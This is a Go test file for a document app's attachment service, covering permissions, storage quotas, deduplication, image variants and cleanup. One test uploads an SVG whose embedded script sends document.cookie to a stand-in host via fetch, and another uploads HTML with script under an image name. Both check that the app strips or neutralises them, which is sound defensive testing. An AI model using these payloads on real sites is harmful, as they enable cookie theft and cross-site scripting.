package service

import (
	"bytes"
	"context"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"mime/multipart"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/magicyuan876/yuheng/internal/docs/acl"
	"github.com/magicyuan876/yuheng/internal/docs/attachment"
	"github.com/magicyuan876/yuheng/internal/docs/model"
	"github.com/magicyuan876/yuheng/internal/types"
	"github.com/magicyuan876/yuheng/internal/types/interfaces"
	"github.com/stretchr/testify/require"
)

// memFiles is a storage backend in memory: enough of the FileService contract
// for the upload and download paths to be exercised end to end.
type memFiles struct {
	mu      sync.Mutex
	objects map[string][]byte
	seq     int
	// signed makes GetFileURL succeed, the way an object store does.
	signed  bool
	deleted []string
}

func newMemFiles() *memFiles { return &memFiles{objects: map[string][]byte{}} }

func (m *memFiles) CheckConnectivity(context.Context) error { return nil }

func (m *memFiles) save(name string, data []byte) string {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.seq++
	path := fmt.Sprintf("mem://%d/%s", m.seq, name)
	stored := make([]byte, len(data))
	copy(stored, data)
	m.objects[path] = stored
	return path
}

func (m *memFiles) SaveFile(_ context.Context, fh *multipart.FileHeader, _ uint64, _ string) (string, error) {
	f, err := fh.Open()
	if err != nil {
		return "", err
	}
	defer func() { _ = f.Close() }()
	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}
	return m.save(fh.Filename, data), nil
}

func (m *memFiles) SaveBytes(_ context.Context, data []byte, _ uint64, name string, _ bool) (string, error) {
	return m.save(name, data), nil
}

func (m *memFiles) GetFile(_ context.Context, path string) (io.ReadCloser, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	data, ok := m.objects[path]
	if !ok {
		return nil, fmt.Errorf("no such object: %s", path)
	}
	return io.NopCloser(bytes.NewReader(data)), nil
}

func (m *memFiles) GetFileURL(_ context.Context, path string) (string, error) {
	if !m.signed {
		return "", fmt.Errorf("this backend serves no URLs")
	}
	return "https://cdn.example.test/" + path + "?sig=abc", nil
}

func (m *memFiles) DeleteFile(_ context.Context, path string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.objects, path)
	m.deleted = append(m.deleted, path)
	return nil
}

func (m *memFiles) CopyFile(_ context.Context, src string, _ uint64, _ string) (string, error) {
	m.mu.Lock()
	data, ok := m.objects[src]
	m.mu.Unlock()
	if !ok {
		return "", fmt.Errorf("no such object: %s", src)
	}
	return m.save("copy", data), nil
}

func (m *memFiles) count() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.objects)
}

// fakeStorage always resolves to one backend.
type fakeStorage struct{ files *memFiles }

func (f fakeStorage) ResolveFileService(context.Context, *types.Tenant, string, string,
	string,
) (interfaces.FileService, string, error) {
	return f.files, "mem", nil
}

// fakeTenants is the workspace storage ledger.
type fakeTenants struct {
	mu     sync.Mutex
	quota  int64
	used   int64
	adjust []int64
}

func (f *fakeTenants) GetTenantByID(_ context.Context, id uint64) (*types.Tenant, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return &types.Tenant{ID: id, StorageQuota: f.quota, StorageUsed: f.used}, nil
}

func (f *fakeTenants) AdjustStorageUsed(_ context.Context, _ uint64, delta int64) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.used += delta
	f.adjust = append(f.adjust, delta)
	return nil
}

func (f *fakeTenants) usedBytes() int64 {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.used
}

// attachEnv is a space with a writer, a reader, a storage backend and a ledger.
type attachEnv struct {
	*pageEnv
	files   *memFiles
	tenants *fakeTenants
}

func newAttachEnv(t *testing.T, quota int64) *attachEnv {
	t.Helper()
	files := newMemFiles()
	tenants := &fakeTenants{quota: quota}
	p := newPageEnvWith(t, func(d *Deps) {
		d.Storage = fakeStorage{files: files}
		d.Tenants = tenants
	})
	return &attachEnv{pageEnv: p, files: files, tenants: tenants}
}

// upload builds a real multipart part, so the service is exercised through the
// same type the HTTP layer hands it.
func upload(t *testing.T, name string, data []byte) *multipart.FileHeader {
	t.Helper()
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	part, err := w.CreateFormFile("file", name)
	require.NoError(t, err)
	_, err = part.Write(data)
	require.NoError(t, err)
	require.NoError(t, w.Close())

	form, err := multipart.NewReader(&buf, w.Boundary()).ReadForm(int64(len(data)) + 4096)
	require.NoError(t, err)
	t.Cleanup(func() { _ = form.RemoveAll() })
	return form.File["file"][0]
}

func (e *attachEnv) put(t *testing.T, actor *acl.Identity, name string, data []byte,
	pageID string,
) (*AttachmentView, error) {
	t.Helper()
	role := e.mustSpaceRole(actor, e.space)
	return e.svc.Files.Upload(ctx(), actor, e.space, role, UploadInput{
		File: upload(t, name, data), PageID: pageID,
	})
}

func testPNG(t *testing.T, w, h int, tint uint8) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, color.RGBA{R: uint8(x % 256), G: uint8(y % 256), B: tint, A: 255})
		}
	}
	var buf bytes.Buffer
	require.NoError(t, png.Encode(&buf, img))
	return buf.Bytes()
}

func readAll(t *testing.T, res *ServeResult) []byte {
	t.Helper()
	if res.Data != nil {
		return res.Data
	}
	defer func() { _ = res.Close() }()
	data, err := io.ReadAll(res.Body)
	require.NoError(t, err)
	return data
}

// Acceptance (T1.6): an attachment URL is not a capability — a user who
// cannot read the page cannot read its files either.
func TestAttachmentDownloadIsRefusedToSomebodyWhoCannotReadThePage(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")
	view, err := e.put(t, e.alice, "photo.png", testPNG(t, 8, 8, 10), page.ID)
	require.NoError(t, err)

	// The space reader may read it.
	res, err := e.svc.Files.Fetch(ctx(), e.carol, view.ID, 0)
	require.NoError(t, err)
	require.NotEmpty(t, readAll(t, res))

	// Somebody with no membership at all is told the attachment does not
	// exist, rather than that it exists and is forbidden.
	_, err = e.svc.Files.Fetch(ctx(), e.viewer, view.ID, 0)
	require.Equal(t, 404, httpCode(t, err))

	// Nor can they delete it.
	require.Equal(t, 404, httpCode(t, e.svc.Files.Delete(ctx(), e.viewer, view.ID)))
}

func TestAttachmentReadFollowsThePagePermissionAfterItNarrows(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")
	view, err := e.put(t, e.alice, "photo.png", testPNG(t, 8, 8, 11), page.ID)
	require.NoError(t, err)

	res, err := e.svc.Files.Fetch(ctx(), e.bob, view.ID, 0)
	require.NoError(t, err)
	require.NotEmpty(t, readAll(t, res))

	// Bob loses his membership of the space; the file goes with it, without
	// anything having to touch the attachment row.
	require.NoError(t, e.svc.Spaces.RemoveMember(ctx(), e.alice, e.space,
		model.Principal{Type: model.PrincipalUser, ID: "bob"}))

	fresh, err := e.resolver.Identity(ctx(), 1, "bob")
	require.NoError(t, err)
	_, err = e.svc.Files.Fetch(ctx(), fresh, view.ID, 0)
	require.Equal(t, 404, httpCode(t, err))
}

// Acceptance (T1.6): an upload over the workspace quota is refused, and the
// ledger reflects exactly what was stored.
func TestAttachmentUploadRespectsTheWorkspaceQuota(t *testing.T) {
	small := testPNG(t, 8, 8, 20)
	e := newAttachEnv(t, int64(len(small))+10)

	first, err := e.put(t, e.alice, "one.png", small, "")
	require.NoError(t, err)
	require.Equal(t, int64(len(small)), e.tenants.usedBytes(), "the ledger must match what was stored")
	require.Equal(t, int64(len(small)), first.Size)

	// A different file no longer fits.
	_, err = e.put(t, e.alice, "two.png", testPNG(t, 40, 40, 21), "")
	require.Equal(t, 409, httpCode(t, err))
	require.Equal(t, int64(len(small)), e.tenants.usedBytes(), "a refused upload must not be charged")
	require.Equal(t, 1, e.files.count(), "and must not leave an object behind")

	// Deleting gives the bytes back.
	require.NoError(t, e.svc.Files.Delete(ctx(), e.alice, first.ID))
	require.Equal(t, int64(0), e.tenants.usedBytes())
	require.Equal(t, 0, e.files.count())
}

// Acceptance (T1.6): uploading the same bytes twice stores them once.
func TestAttachmentUploadDeduplicatesIdenticalBytes(t *testing.T) {
	e := newAttachEnv(t, 0)
	data := testPNG(t, 16, 16, 30)

	first, err := e.put(t, e.alice, "diagram.png", data, "")
	require.NoError(t, err)
	// A different person, a different name, the same bytes.
	second, err := e.put(t, e.bob, "copy-of-diagram.png", data, "")
	require.NoError(t, err)

	require.NotEqual(t, first.ID, second.ID, "each reference is its own attachment")
	require.Equal(t, 1, e.files.count(), "but there is only one stored object")
	require.Equal(t, int64(len(data)), e.tenants.usedBytes(), "and the workspace is charged once")

	// Both still read back correctly.
	for _, id := range []string{first.ID, second.ID} {
		res, err := e.svc.Files.Fetch(ctx(), e.alice, id, 0)
		require.NoError(t, err)
		require.Equal(t, data, readAll(t, res))
	}

	// Deleting one must not break the other.
	require.NoError(t, e.svc.Files.Delete(ctx(), e.alice, first.ID))
	require.Equal(t, 1, e.files.count(), "the object survives while a reference remains")
	require.Equal(t, int64(len(data)), e.tenants.usedBytes())
	res, err := e.svc.Files.Fetch(ctx(), e.alice, second.ID, 0)
	require.NoError(t, err)
	require.Equal(t, data, readAll(t, res))

	// Deleting the last reference releases it.
	require.NoError(t, e.svc.Files.Delete(ctx(), e.bob, second.ID))
	require.Equal(t, 0, e.files.count())
	require.Equal(t, int64(0), e.tenants.usedBytes())
}

// Acceptance (T1.6): an uploaded SVG cannot carry script, and what is stored
// is the sanitised document rather than the original.
func TestAttachmentUploadStoresTheSanitisedSVG(t *testing.T) {
	e := newAttachEnv(t, 0)
	hostile := []byte(`<svg xmlns="http://www.w3.org/2000/svg">` +
		`<script>fetch("https://evil.test?c="+document.cookie)</script>` +
		`<circle r="5" onload="alert(1)" fill="#0f0"/></svg>`)

	view, err := e.put(t, e.alice, "drawing.svg", hostile, "")
	require.NoError(t, err)
	require.Equal(t, attachment.MediaSVG, view.Mime)

	res, err := e.svc.Files.Fetch(ctx(), e.alice, view.ID, 0)
	require.NoError(t, err)
	stored := string(readAll(t, res))
	require.NotContains(t, stored, "<script")
	require.NotContains(t, stored, "onload")
	require.NotContains(t, stored, "evil.test")
	require.Contains(t, stored, "circle", "the drawing survives")

	// It renders, but only under a sandbox, and never through a redirect that
	// would escape these headers.
	require.True(t, res.Inline)
	require.True(t, res.Sandbox)
	require.Empty(t, res.Redirect)
}

func TestAttachmentUploadClassifiesByContentNotByName(t *testing.T) {
	e := newAttachEnv(t, 0)

	// A page of HTML with an image's name must never be served as an image.
	view, err := e.put(t, e.alice, "innocent.png", []byte("<html><body><script>alert(1)</script></body></html>"), "")
	require.NoError(t, err)
	require.NotEqual(t, "image/png", view.Mime)
	require.Equal(t, attachment.KindFile, view.Kind)

	res, err := e.svc.Files.Fetch(ctx(), e.alice, view.ID, 0)
	require.NoError(t, err)
	require.False(t, res.Inline, "it must be downloaded, not rendered")
	require.Equal(t, attachment.MediaOctetStream, res.ContentType)
	_ = readAll(t, res)

	// And a real image keeps its dimensions, whatever it was called.
	img, err := e.put(t, e.alice, "notes.txt", testPNG(t, 24, 12, 40), "")
	require.NoError(t, err)
	require.Equal(t, "image/png", img.Mime)
	require.NotNil(t, img.Width)
	require.Equal(t, 24, *img.Width)
	require.Equal(t, 12, *img.Height)
}

func TestAttachmentUploadNeedsWriteAccess(t *testing.T) {
	e := newAttachEnv(t, 0)
	_, err := e.put(t, e.carol, "photo.png", testPNG(t, 8, 8, 50), "")
	require.Equal(t, 403, httpCode(t, err))
}

func TestAttachmentUploadRefusesAPageInAnotherSpaceOrOneItCannotWrite(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")

	// Carol reads the space but cannot write the page, so she cannot pin a
	// file to it either.
	role := e.mustSpaceRole(e.carol, e.space)
	_, err := e.svc.Files.Upload(ctx(), e.carol, e.space, role, UploadInput{
		File: upload(t, "x.png", testPNG(t, 8, 8, 60)), PageID: page.ID,
	})
	require.Equal(t, 403, httpCode(t, err))

	// A page id that does not exist is not found rather than ignored.
	_, err = e.put(t, e.alice, "x.png", testPNG(t, 8, 8, 61), "no-such-page")
	require.Error(t, err)
}

func TestAttachmentUploadRefusesAnOversizedOrEmptyFile(t *testing.T) {
	files := newMemFiles()
	p := newPageEnvWith(t, func(d *Deps) {
		d.Storage = fakeStorage{files: files}
		d.Tenants = &fakeTenants{}
		d.MaxAttachmentBytes = 64
	})
	role := p.mustSpaceRole(p.alice, p.space)

	_, err := p.svc.Files.Upload(ctx(), p.alice, p.space, role, UploadInput{
		File: upload(t, "big.bin", bytes.Repeat([]byte("x"), 200)),
	})
	require.Equal(t, 400, httpCode(t, err))

	_, err = p.svc.Files.Upload(ctx(), p.alice, p.space, role, UploadInput{
		File: upload(t, "empty.bin", nil),
	})
	require.Equal(t, 400, httpCode(t, err))
	require.Equal(t, 0, files.count())
}

func TestAttachmentDownloadRedirectsOnlyForTypesItWouldRenderAnyway(t *testing.T) {
	e := newAttachEnv(t, 0)
	e.files.signed = true

	img, err := e.put(t, e.alice, "photo.png", testPNG(t, 8, 8, 70), "")
	require.NoError(t, err)
	res, err := e.svc.Files.Fetch(ctx(), e.alice, img.ID, 0)
	require.NoError(t, err)
	require.NotEmpty(t, res.Redirect, "an image may be fetched straight from the store")

	// A download must keep passing through this server, because that is where
	// the headers that stop it being treated as a document are applied.
	doc, err := e.put(t, e.alice, "report.txt", []byte("plain words, nothing more"), "")
	require.NoError(t, err)
	res, err = e.svc.Files.Fetch(ctx(), e.alice, doc.ID, 0)
	require.NoError(t, err)
	require.Empty(t, res.Redirect)
	require.False(t, res.Inline)
	_ = readAll(t, res)

	// So must an SVG, whose safety depends on the sandbox header.
	svg, err := e.put(t, e.alice, "d.svg", []byte(`<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>`), "")
	require.NoError(t, err)
	res, err = e.svc.Files.Fetch(ctx(), e.alice, svg.ID, 0)
	require.NoError(t, err)
	require.Empty(t, res.Redirect)
	_ = readAll(t, res)
}

func TestAttachmentVariantsRenderSmallerImagesAndAreCached(t *testing.T) {
	e := newAttachEnv(t, 0)
	view, err := e.put(t, e.alice, "wide.png", testPNG(t, 1200, 600, 80), "")
	require.NoError(t, err)
	require.Equal(t, []int{320, 800}, view.Variants, "only widths smaller than the original are offered")

	res, err := e.svc.Files.Fetch(ctx(), e.alice, view.ID, 320)
	require.NoError(t, err)
	small := readAll(t, res)
	w, _, ok := attachment.Dimensions(small)
	require.True(t, ok)
	require.Equal(t, 320, w)
	require.Equal(t, "image/png", res.ContentType)

	// The second read comes from the cache, not from storage.
	require.NoError(t, e.files.DeleteFile(ctx(), "mem://1/wide.png"))
	again, err := e.svc.Files.Fetch(ctx(), e.alice, view.ID, 320)
	require.NoError(t, err)
	require.Equal(t, small, readAll(t, again))

	// A width nobody offers falls back to the original rather than erroring.
	e2 := newAttachEnv(t, 0)
	orig := testPNG(t, 100, 100, 81)
	v2, err := e2.put(t, e2.alice, "small.png", orig, "")
	require.NoError(t, err)
	res2, err := e2.svc.Files.Fetch(ctx(), e2.alice, v2.ID, 1600)
	require.NoError(t, err)
	require.Equal(t, orig, readAll(t, res2))
}

// An image pasted into a page belongs to that page once the page is saved,
// which is what the editor's paste-then-autosave flow relies on.
func TestAttachmentBindsToThePageThatReferencesItOnSave(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")
	view, err := e.put(t, e.alice, "pasted.png", testPNG(t, 8, 8, 90), "")
	require.NoError(t, err)
	require.Empty(t, view.PageID, "an upload is unbound until a document keeps it")

	body := fmt.Sprintf(
		`{"type":"doc","content":[{"type":"image","attrs":{"attachmentId":%q,"src":null}}]}`, view.ID)
	_, err = e.svc.Collab.Persist(ctx(), PersistInput{
		TenantID: 1, PageID: page.ID, BaseVersion: 0,
		YDoc: []byte("state"), Content: []byte(body), EditorIDs: []string{"alice"},
	})
	require.NoError(t, err)

	rows, err := e.repos.Files.ListByPage(ctx(), 1, page.ID)
	require.NoError(t, err)
	require.Len(t, rows, 1)
	require.Equal(t, view.ID, rows[0].ID)

	stored, err := e.repos.Pages.Get(ctx(), 1, page.ID)
	require.NoError(t, err)
	require.Equal(t, int64(len(testPNG(t, 8, 8, 90))), stored.AttachmentBytes,
		"the page's attachment total is recomputed on save")
}

// Deleting a page keeps its files, because the page can still be restored;
// emptying the trash is what releases them.
func TestAttachmentsSurviveTheTrashAndGoOnPurge(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")
	view, err := e.put(t, e.alice, "photo.png", testPNG(t, 8, 8, 100), page.ID)
	require.NoError(t, err)
	used := e.tenants.usedBytes()
	require.Positive(t, used)

	_, err = e.svc.Pages.Delete(ctx(), e.alice, e.decision(t, e.alice, page.ID))
	require.NoError(t, err)
	require.Equal(t, 1, e.files.count(), "a page in the trash keeps its files")
	require.Equal(t, used, e.tenants.usedBytes())

	_, err = e.svc.Pages.Purge(ctx(), e.alice, e.space, page.ID)
	require.NoError(t, err)
	require.Equal(t, 0, e.files.count(), "purging releases them")
	require.Equal(t, int64(0), e.tenants.usedBytes())

	_, err = e.svc.Files.Fetch(ctx(), e.alice, view.ID, 0)
	require.Error(t, err)
}

func TestAttachmentOrphansAreListedForTheMaintenanceSweep(t *testing.T) {
	e := newAttachEnv(t, 0)
	page := e.create(t, e.alice, nil, "Page")
	bound, err := e.put(t, e.alice, "kept.png", testPNG(t, 8, 8, 110), page.ID)
	require.NoError(t, err)
	loose, err := e.put(t, e.alice, "abandoned.png", testPNG(t, 8, 8, 111), "")
	require.NoError(t, err)

	// Nothing is an orphan yet: the sweep only collects what has been sitting
	// unreferenced for a while.
	fresh, err := e.repos.Files.ListOrphans(ctx(), time.Now().UTC().Add(-time.Hour), 100)
	require.NoError(t, err)
	require.Empty(t, fresh)

	later, err := e.repos.Files.ListOrphans(ctx(), time.Now().UTC().Add(time.Hour), 100)
	require.NoError(t, err)
	require.Len(t, later, 1)
	require.Equal(t, loose.ID, later[0].ID)
	require.NotEqual(t, bound.ID, later[0].ID)
}

func TestAttachmentUploadWithoutAStorageBackendIsRefusedClearly(t *testing.T) {
	p := newPageEnv(t)
	role := p.mustSpaceRole(p.alice, p.space)
	_, err := p.svc.Files.Upload(ctx(), p.alice, p.space, role, UploadInput{
		File: upload(t, "x.png", testPNG(t, 8, 8, 120)),
	})
	require.Error(t, err)
	require.Contains(t, strings.ToLower(err.Error()), "storage")
}
